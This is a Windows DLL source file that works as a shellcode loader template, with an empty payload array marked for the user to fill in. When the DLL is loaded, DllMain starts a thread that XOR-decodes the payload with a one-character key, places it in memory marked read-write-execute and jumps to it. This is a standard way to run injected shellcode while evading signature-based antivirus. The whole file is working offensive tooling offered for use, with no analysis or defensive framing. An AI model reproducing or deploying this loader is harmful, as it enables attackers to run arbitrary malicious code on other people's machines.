#include "pch.h"


unsigned char payload[] =
""; // Your payload comes here.

unsigned int payload_len = sizeof(payload);

DWORD WINAPI run() {
	LPVOID memory;  // memory buffer for payload
	HANDLE pHandle; // process handle
	char xkey = 'x';
	int i = 0;
	for (i; i < sizeof(payload) - 1; i++)
	{
		payload[i] = payload[i] ^ xkey;
	}
	// get the current process handle
	pHandle = GetCurrentProcess();

	// allocate memory and set the read, write and execute flag
	memory = VirtualAllocEx(pHandle, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	// copy the shellcode into the newly allocated memory
	WriteProcessMemory(pHandle, memory, (LPCVOID)&payload, payload_len, NULL);

	// Execute the shell code
	((void(*)())memory)();

	return 0;
}


BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
	HANDLE threadhandle;
	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
		threadhandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)run, NULL, 0, NULL);
		CloseHandle(threadhandle);
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}